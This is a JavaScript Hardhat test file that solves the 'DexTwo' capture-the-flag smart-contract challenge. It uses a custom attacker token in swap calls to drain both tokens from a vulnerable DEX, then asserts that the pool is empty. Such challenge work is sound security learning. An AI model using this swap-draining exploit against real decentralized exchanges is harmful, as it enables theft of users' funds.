const {ethers, network} = require("hardhat")
const {BigNumber, Contract, Signer} = require("ethers");
const {expect, assert} = require("chai")
const {getContract} = require("./helpers");
const targetName = "DexTwo";
const attackerName = "DexTwoAttacker";

describe(`${targetName} challenge`, function () {

    let accounts, player, target, attacker;
    let token1, token2;
    let symbols = [];
    let targetAddress;

    beforeEach(async () => {
        accounts = await ethers.getSigners();
        player = accounts[0];
        if (network.name === 'rinkeby') {
            assert.equal(await player.getAddress(), '0xe5e00c76DB49E2aB2294b19dDb3145C8975cF8a2',
                `Address at first account (${player.address}) is not correct.`);
            targetAddress = '0x6b700512DEC413B8Df4c3E52352178cAEBc9a73F';
        }

        if(network.name === 'hardhat') {
            const levelFactory = await getContract('DexTwoFactory');
            let txn = await levelFactory.createInstance(player.address);
            txn.wait();
            let receipt = await ethers.provider.getTransactionReceipt(txn.hash);
            const log = receipt.logs[0];
            targetAddress = log.address;
            console.log(`Deployed ${targetName} using level factory at ${await levelFactory.address} to ${targetAddress}`);
            target = await getContract(targetName, targetAddress);
        } else {
            target = await getContract(targetName, targetAddress);
        }
        assert.isNotNull(target);
        console.log(`${targetName} address = ${await target.address}`);

        attacker = await getContract(attackerName);
        console.log(attackerName, " = ", attacker.address);
    });

    it("Solves DexTwo challenge.", async () => {
        let txn = await target.approve(target.address, 100, {
            gasPrice: 5000000000
        });
        txn.wait();

        txn = await target.swap(attacker.address, (await target.token1()), 100, {
            gasPrice: 5000000000
        });
        txn.wait(1);
        txn = await target.swap(attacker.address, (await target.token2()), 100, {
            gasPrice: 5000000000
        });
        txn.wait(1);

        assert.isTrue((
                (await target.balanceOf((await target.token1()), target.address)).toNumber() === 0 &&
                (await target.balanceOf((await target.token2()), target.address)).toNumber() === 0),
            "None of either token remains in Dex.");
    });

    it.skip("Verifies my understanding of the inner-workings of the Dex.", async () => {
    });
});